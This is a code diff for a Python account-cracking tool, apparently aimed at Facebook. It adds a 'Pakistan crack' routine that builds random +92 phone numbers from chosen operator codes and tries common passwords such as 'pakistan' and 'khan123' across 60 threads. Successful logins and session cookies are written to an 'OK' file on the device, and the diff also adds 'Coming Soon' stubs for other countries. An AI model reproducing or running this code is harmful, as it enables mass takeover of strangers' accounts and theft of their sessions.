@@ -293,7 +293,7 @@ def _pornhub_():
 
 def shbd():
     user=[]
-    clear()
+    os.system('clear')
     banner()
     print(f"                 \x1b[1;92m BD CRACK \x1b[1;37m ");time.sleep(0.05)
     print('   \033[1;92m BD CODE: \x1b[1;37m[\x1b[1;92m016\x1b[1;37m][\x1b[1;94m017\x1b[1;37m][\x1b[1;93m019\x1b[1;37m]')
@@ -303,7 +303,7 @@ def shbd():
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     with ThreadPool(max_workers=60) as smiyaaa:    
-        clear()
+        os.system('clear')
         banner()
         tl = str(len(user))
         for love in user:
@@ -311,18 +311,52 @@ def shbd():
             pwx = [(code+love), (love), ('arsalan'), ('free fire')]
             smiyaaa.submit(m, uid, pwx, tl)
 
-def shind(): pass
-def shpak(): pass
-def shindo(): pass
-def gmail(): pass
-def user(): pass
+def shpak():
+    user=[]
+    os.system('clear')
+    banner()
+    print(f"                 \x1b[1;92m PAKISTAN CRACK \x1b[1;37m ");time.sleep(0.05)
+    print('   \033[1;92m PAK CODE: \x1b[1;37m[\x1b[1;92m0300\x1b[1;37m][\x1b[1;94m0301\x1b[1;37m][\x1b[1;93m0302\x1b[1;37m][\x1b[1;95m0312\x1b[1;37m]')
+    code = input(f' CHOOSE CODE :\x1b[1;92m ')
+    limit = int(input(f'    \x1b[1;37m[\x1b[1;93m?\x1b[1;37m] CRACK ID LIMIT : \x1b[1;92m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=60) as smiyaaa:    
+        os.system('clear')
+        banner()
+        tl = str(len(user))
+        for love in user:
+            uid = '+92'+code+love
+            pwx = [(code+love), (love), ('arsalan'), ('pakistan'), ('khan123')]
+            smiyaaa.submit(m, uid, pwx, tl)
+
+def shind():
+    print("\n\x1b[1;91m[!] India Cloning Coming Soon!")
+    time.sleep(2)
+    _pornhub_()
+
+def shindo():
+    print("\n\x1b[1;91m[!] Indonesia Cloning Coming Soon!")
+    time.sleep(2)
+    _pornhub_()
+
+def gmail():
+    print("\n\x1b[1;91m[!] Gmail Cloning Coming Soon!")
+    time.sleep(2)
+    _xnxx_()
+
+def user():
+    print("\n\x1b[1;91m[!] Username Cloning Coming Soon!")
+    time.sleep(2)
+    _xnxx_()
     
 def m(uid,pwx,tl):
     global loop, ok, lok, twf, numan
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r    \x1b[1;37m[ARSALAN][\x1b[1;93m%s\x1b[1;37m/\x1b[1;94m%s\x1b[1;37m][\x1b[1;92mOK\x1b[1;37m/\x1b[1;91mLOK\x1b[1;37m] \r'%(loop,tl)),
+            sys.stdout.write(f'\r    \x1b[1;37m[ARSALAN][\x1b[1;93m{loop}\x1b[1;37m/\x1b[1;94m{tl}\x1b[1;37m][\x1b[1;92mOK:{len(ok)}\x1b[1;37m] \r')
             sys.stdout.flush()
             nn = random.choice(numan)
             req_url = session.get(f'https://{fg}').text
@@ -345,7 +379,7 @@ def m(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uidf = coki[151:166]
-                print('\n\033[1;92m[ARSALAN-OK] '+uid+' | '+ps)
+                print(f'\n\033[1;92m[ARSALAN-OK] {uid} | {ps}')
                 open('/sdcard/ARSALAN-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                 ok.append(uidf)
                 break
